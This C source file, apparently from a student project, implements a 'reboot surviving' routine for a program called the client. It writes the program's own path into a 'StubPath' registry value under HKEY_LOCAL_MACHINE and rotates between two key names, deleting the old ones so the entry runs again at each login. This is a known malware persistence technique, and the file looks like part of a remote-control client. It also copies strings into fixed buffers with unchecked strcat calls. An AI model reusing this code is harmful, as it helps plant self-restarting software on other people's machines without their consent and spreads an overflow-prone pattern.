/*
** File		reboot.c
** Author	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		reboot surviving
*/

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntddk.h>
#include "client.h"

int						registerRebootKey()
{
	char				cmdline[PATHSIZE_MAX];
	char				pathkey1[PATHSIZE_MAX];
	char				pathkey2[PATHSIZE_MAX];
	char				*pathkey = pathkey1;
	char				*namekey = NAME_KEY1;
	HKEY				hKey;
	HKEY				hKey2;
	DWORD				Action;
    SECURITY_ATTRIBUTES	SecAtt;

	SecAtt.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecAtt.lpSecurityDescriptor = NULL;
	SecAtt.bInheritHandle = TRUE;

	pathkey1[0] = '\0';
    strcat(pathkey1, PATH_KEY);
    strcat(pathkey1, "\\");
    strcat(pathkey1, NAME_KEY1);
	
	pathkey2[0] = '\0';
    strcat(pathkey2, PATH_KEY);
    strcat(pathkey2, "\\");
    strcat(pathkey2, NAME_KEY2);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, pathkey2, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
       pathkey = pathkey1;
       namekey = NAME_KEY1;
       RegCloseKey(hKey);
    }
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, pathkey1, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
       pathkey = pathkey2;
       namekey = NAME_KEY2;
       RegCloseKey(hKey);
    }
    RegDeleteKey(HKEY_LOCAL_MACHINE, pathkey1);
    RegDeleteKey(HKEY_LOCAL_MACHINE, pathkey2);
    RegDeleteKey(HKEY_CURRENT_USER, pathkey1);
    RegDeleteKey(HKEY_CURRENT_USER, pathkey2);

	GetModuleFileName(NULL, cmdline, PATHSIZE_MAX);
	strcat(cmdline, REBOOT_OPTIONS);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, PATH_KEY, 0, KEY_ALL_ACCESS, &hKey);
	RegCreateKeyEx(hKey, namekey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &SecAtt, &hKey2, &Action);
	RegSetValueEx(hKey2, "StubPath", 0, REG_SZ, (const BYTE *) cmdline, strlen(cmdline));
	RegCloseKey(hKey2);
	RegCloseKey(hKey);
	return (0);
}

void		surviveReboot(char *params)
{
	if (strcmp(params + strlen("--reboot "), "on") == 0)
	{
		if (registerRebootKey() == -1)
			printf("Registering reboot key failed\n");
	}
	else if (strcmp(params + strlen("--reboot "), "off") == 0)
	{
		printf("Not implemented yet :)\n");
	}
	else
		printf("Invalid parameter: %s\n", params + strlen("--reboot "));
}
